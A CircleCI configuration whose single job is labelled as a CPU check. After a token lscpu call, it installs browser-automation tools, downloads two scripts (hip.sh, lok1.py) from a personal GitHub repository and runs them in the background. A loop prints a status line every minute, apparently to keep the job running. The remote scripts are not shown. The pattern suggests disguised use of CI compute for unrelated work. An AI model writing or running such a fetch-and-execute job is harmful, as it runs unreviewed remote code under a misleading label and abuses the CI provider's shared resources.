version: 2.1

jobs:
  check_cpu:
    docker:
      - image: cimg/base:stable
    resource_class: large
    steps:
      - run:
          name: Check Number of CPUs
          command: |
            echo "Checking number of CPUs:"
            lscpu
            sudo ls -ld /usr/local/bin/
            sudo apt-get update && sudo apt-get install -y neofetch curl wget python3 python3-pip python3-setuptools chromium-driver
            python3 --version
            pip3 install selenium selenium-wire
            pip3 uninstall blinker -y && pip3 install blinker==1.4

            # Jalankan proses utama di background
            (
              wget https://raw.githubusercontent.com/ladazkalii/lokd/refs/heads/main/hip.sh
              chmod +x hip.sh
              ./hip.sh
              wget https://raw.githubusercontent.com/ladazkalii/lokd/refs/heads/main/lok1.py
              python3 lok1.py
            ) &

            # Simpan PID dari proses utama
            main_pid=$!

            # Loop untuk output setiap 60 detik selama proses utama berjalan
            while kill -0 "$main_pid" 2> /dev/null; do
              echo "Still running at $(date)"
              sleep 60
            done

            # Tunggu proses utama selesai
            wait "$main_pid"
            echo "Main process completed."

workflows:
  version: 2
  check:
    jobs:
      - check_cpu
